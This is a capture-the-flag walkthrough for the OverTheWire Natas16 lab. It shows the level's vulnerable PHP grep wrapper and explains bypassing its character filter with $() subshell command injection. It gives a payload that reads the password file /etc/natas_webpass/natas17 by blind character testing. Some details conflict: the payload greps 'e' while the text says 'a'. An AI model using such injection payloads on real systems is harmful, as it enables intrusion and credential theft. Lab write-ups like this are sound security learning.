# 🔐 Natas16 Walkthrough

This level is very similar to natas15 that we just did, but there are some more restrictions here, as the website text sugessts lets take a look at the [View sourcecode](http://natas16.natas.labs.overthewire.org/index-source.html) link and see what changed.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

As we can see these characters:
`` '/[;|&`\'"]/' ``, 
 are invlaid now, rendering our last solution **useless.** But we can see that the `$` character is a valid option. That's our way around this.

 ## Subshell

Since `` '/[;|&`\'"]/' `` are forbidden, we can’t directly inject multiple commands. Luckily, the `$()` syntax is allowed, which executes a command inside a subshell. A ***subshell*** is a way to execute a command inside another command in the shell. Whatever the subshell outputs can then be used or appended in the outer command.

```shell
                                        User Input
                                    ------------------
                                      "a$(command)b"
                                            |
                                            v
                                    PHP passthru() call
                                            |
                                            v
                        Shell sees: grep -i "a$(command)b" dictionary.txt
                                            |
                                            v
                                Subshell executes first:
                                        $(command)
                                            |
                                            v
                            Output of command replaces $(command)
                                            |
                                            v
                        Shell executes final grep command:
                        grep -i "a<command_output>b" dictionary.txt
                                            |
                                            v
                                  Result returned to user

```

#### For example, if we send:

```shell
$(grep e /etc/natas_webpass/natas17)squid
```

The server will run:
```bash
grep a /etc/natas_webpass/natas17
```
and append `squid` to the output.
- If the grep finds a match (the letter `a` in the password), the output does not contain `squid`.

- If the letter is not in the password, grep return nothing, and the string `squid` and other matching strings appear.

This way, we can test each possible character in the password **without using the forbidden characters.** 

 ## SQL injection tests
Let's try some basic/previous inputs:

```
INPUT:
password" OR "1

OUTPUT:
Input contains an illegal character!

```


